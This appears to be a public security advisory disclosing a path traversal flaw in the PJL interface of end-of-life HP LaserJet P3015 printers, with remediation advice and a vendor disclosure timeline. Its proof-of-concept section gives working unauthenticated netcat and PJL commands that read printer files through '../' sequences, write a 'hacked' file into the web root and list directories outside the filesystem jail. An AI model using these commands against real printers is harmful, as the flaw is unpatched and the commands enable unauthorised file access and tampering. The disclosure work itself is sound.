# HP LaserJet P3015 - Path Traversal via PJL Protocol
This product is End of Life/End of Support and this vulnerability **will not be patched**.
## Summary

HP LaserJet P3015 printers running firmware up to and including version **07.250.2** are vulnerable to path traversal attacks via the PJL (Printer Job Language) protocol on port 9100. This vulnerability allows unauthenticated remote attackers to **read and write arbitrary files** on the printer filesystem, as well as download files to a local machine.

## Affected Product

| Field | Details |
|---|---|
| **Vendor** | Hewlett-Packard (HP) |
| **Product** | HP LaserJet P3015 |
| **Affected Versions** | All firmware versions up to and including **07.250.2** (January 2017) |
| **Protocol** | PJL (Printer Job Language) — TCP port 9100 |
| **Authentication Required** | None |
| **Attack Vector** | Local Network / Remote Network |

## Vulnerability Details

The HP LaserJet P3015 firmware does not properly sanitize or normalize path traversal sequences (e.g., `../`) in PJL filesystem commands. An unauthenticated attacker on the network can leverage `FSUPLOAD`, `FSDOWNLOAD`, and `FSDIRLIST` PJL commands to escape the intended filesystem jail and access arbitrary files on the printer's underlying operating system.

While PJL execution can be disabled or a password PIN can be required for port 9100, **these are not the default configurations**. Out of the box, the device is fully exposed and there is no setup sequence that forces the administrator to configure credentials, leaving a significant number of devices vulnerable in the wild. Most users of the device are not aware of the existence of the vulnerability, nor the implications of PJL so the defaults remain intact in many cases.

Previous mitigation attempts *appear* to have relied on blacklisting certain paths or files (e.g., `/etc/passwd` returns limited output), but path traversal sequences are **not normalized**, allowing trivial bypasses. Arbitrary file write and access to configuration files remain fully functional.

## Proof of Concept

### Prerequisites

- Network access to the target printer on **TCP port 9100**
- `netcat` or for ease of exploitation, [PRET](https://github.com/RUB-NDS/PRET)

### Manual Exploitation via Netcat

#### Connect to the printer:

```bash
nc <PRINTER_IP> 9100
```

> **Note:** No connection banner is displayed. Paste commands directly.

#### Read `/etc/hosts`

```
@PJL FSUPLOAD NAME="0:/../../../etc/hosts" OFFSET=0 SIZE=10000
```

#### Read Web Server Configuration

```
@PJL FSUPLOAD NAME="0:/webServer/config/soe.xml" OFFSET=0 SIZE=100000
```

#### Arbitrary File Write

```
@PJL FSDOWNLOAD FORMAT:BINARY SIZE=29 NAME="0:/webServer/home/proof.txt"
This printer has been hacked!
@PJL EOJ
```
<img width="610" height="98" alt="file-write" src="https://github.com/user-attachments/assets/7886a58b-8a34-4114-b0b6-82ba3a07cfcc" />

#### List Files in Current Directory

```
@PJL FSDIRLIST NAME="0:/" ENTRY=1 COUNT=999
```

#### List Files via Path Traversal

```
@PJL FSDIRLIST NAME="0:/../../../../" ENTRY=1 COUNT=999
```
<img width="375" height="213" alt="listing-files" src="https://github.com/user-attachments/assets/c1ccf7c1-5ba3-48e0-b50f-a5d7c95f7f64" />

### Exploitation via PRET

For a more interactive experience, use the [Printer Exploitation Toolkit (PRET)](https://github.com/RUB-NDS/PRET):

```bash
python pret.py <PRINTER_IP> pjl
```
<img width="841" height="600" alt="pret" src="https://github.com/user-attachments/assets/690c4fda-283c-4e1b-ba48-53ffcc26b4a9" />

## Remediation

- Disable PJL execution on port 9100 if not required.
- Set a PJL password/PIN to restrict access to filesystem commands.
- Isolate printers on a dedicated VLAN with strict firewall rules preventing unauthorized access to port 9100.
- Sorry, EOL/EOS means it is what it is. Toss it.

> **Note:** HP has not released updated firmware for this model since January 2017. The HP LaserJet P3015 has reached end-of-life and will NOT receive a patch. TLDR; if you have this model of printer in your business, time to upgrade.
## Timeline

| Date | Event |
|---|---|
| Feb 4th, 2026 | Vulnerability discovered and Reported |
| Feb 4th, 2026 | HP PSRT automation asks for Proof of Concept |
| Feb 5th, 2026 | HP PSRT assigns case number, and agrees to follow up after review |
| Feb 9th, 2026 | HP PSRT declares the following assessment: The print product team investigated your report and has determined that the HP LaserJet P3015 has reached its end of support life across all SKUs. Unfortunately, product updates are no longer being delivered. The team also tested against current generation products for path traversal and FSDOWNLOAD, FSUPLOAD are not supported on newer devices. |
| Feb 9th, 2026 | Researcher asks if HP wants to make the general public aware of the "End of Life/End of Support" status, to encourage users to replace the printer. |
| Feb 17th, 2026 | No response, vulnerability disclosed. |

## References

- [PRET - Printer Exploitation Toolkit](https://github.com/RUB-NDS/PRET)
- [CVE-2010-4107 - Original HP PJL Path Traversal Discovered on Other Models](https://nvd.nist.gov/vuln/detail/CVE-2010-4107)
